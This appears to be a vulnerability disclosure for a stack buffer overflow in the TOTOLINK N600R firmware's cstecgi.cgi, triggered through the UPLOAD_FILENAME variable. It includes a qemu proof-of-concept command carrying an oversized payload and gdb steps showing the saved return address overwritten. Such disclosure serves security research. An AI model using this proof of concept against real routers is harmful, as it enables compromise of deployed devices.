# TOTOLINK_N600R_V4.3.0cu.7866_B20220506-stack overflow
## File information
TOTOLINK_N600R_V4.3.0cu.7866_B20220506.web
Unzipped cstecgi.cgi
Download address: https://totolink.tw/support_view/N600R

## stack overflow
![攻击点](https://i.miji.bid/2025/04/11/2ad138a4cf77b7797988f62bab06ad44.png)

At the binary file address 0x00423914 (in the main function), sprintf is called. Variables such as acstack_ have clear size limits in the context, but the content_ptr required for FileName is read from the environment variable UPLOAD_FILENAME. The function call here does not check UPLOAD_FILENAME, which poses a buffer overflow risk.
![获得FILENAME](https://i.miji.bid/2025/04/11/7fb8540479f24de054af4ca47587c9fc.png)


## Simulate running in qemu
```bash
PAYLOAD=$(python3 -c "print('a'*6023+'DOIT')")
sudo chroot ./ ./qemu-mips-static\
	-E QUERY_STRING="action=upload&\"abc\" : [ &2aaaa&3aaaaaaaa&4aaaaaaaa&5aaaaaa" \
	-E UPLOAD_FILENAME="$PAYLOAD"\
	-E CONTENT_LENGTH="123" -g 123 -L ./lib \
	./web_cste/cgi-bin/cstecgi.cgi  <  ./poc
```


```bash
gdb-multiarch  ./web_cste/cgi-bin/cstecgi.cgi
```
Set a breakpoint at the address after sprintf is executed. Found that the buffer overflow is successful.

![enter image description here](https://i.miji.bid/2025/04/11/ccafab023430897fd2c42575fcf67d54.md.png)

Set a breakpoint before returning to the code block and find that the ra saved from the stack has become "DOIT"

![enter image description here](https://i.miji.bid/2025/04/11/a2d7030217022468118fc352dba55973.png)

